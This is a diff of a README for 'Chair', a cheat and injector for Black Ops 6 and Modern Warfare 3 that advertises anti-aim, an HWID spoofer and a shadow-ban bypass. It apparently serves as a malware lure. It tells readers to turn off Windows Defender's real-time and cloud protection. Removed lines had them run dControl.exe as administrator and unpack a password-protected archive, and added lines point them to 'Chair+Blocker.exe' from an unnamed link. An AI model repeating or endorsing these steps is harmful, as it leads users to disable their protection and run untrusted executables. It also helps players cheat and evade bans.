@@ -1,6 +1,5 @@
-_____VERY LOW BAN RATE!!!_____
-![showcase1](screenshots/showcase1.png)
-
+___HUGE UPDATE!!! ANTI AIM ADDED!!!___
+![showcase1](screenshots/showcase1.jpg)
 
 __INSTRUCTIONS FOR USE__ </br>
 ___> ⚠️ **Important:** Before running, you must disable **Real-time protection** and **Cloud-delivered protection** in Windows Defender to allow the tool to function properly. Without this step, the tool will not work! See below for instructions with images.___
@@ -26,16 +25,7 @@ To ensure functionality of the loader, make sure **Real-time protection** and **
 ### Step 2: Launching the Injector
 
 1. **Download the Tool**  
-   - Get `Chair.rar` from the provided link.
-
-2. **Extract the loader**
-   - The archive is password protected, in order to extract it you will need 7Zip, WinZip, WinRAR, or another archive extractor tool of your choice.
-   - Archive password is __S7Crackz__
-
-3. **Disable Windows Defender**
-   - Run `dControl.exe` as administrator, and click Disable Windows Defender.
-
-   ![dControl.exe](screenshots/dcontrol.png)
+   - Get `Chair+Blocker.exe` from the provided link.
 
 3. **Prepare for Injection**  
    - Make sure **Black Ops 6** is closed before proceeding.
@@ -126,4 +116,3 @@ Play worry-free with an included HWID spoofer and shadow ban bypass.
 
 > **Enjoy gameplay with advanced features and total customization.** Follow the setup instructions closely, and dive into the enhanced experience in Modern Warfare 3!</br>
 Enjoy!!</br>
-Archive password is: __S7Crackz__</br>
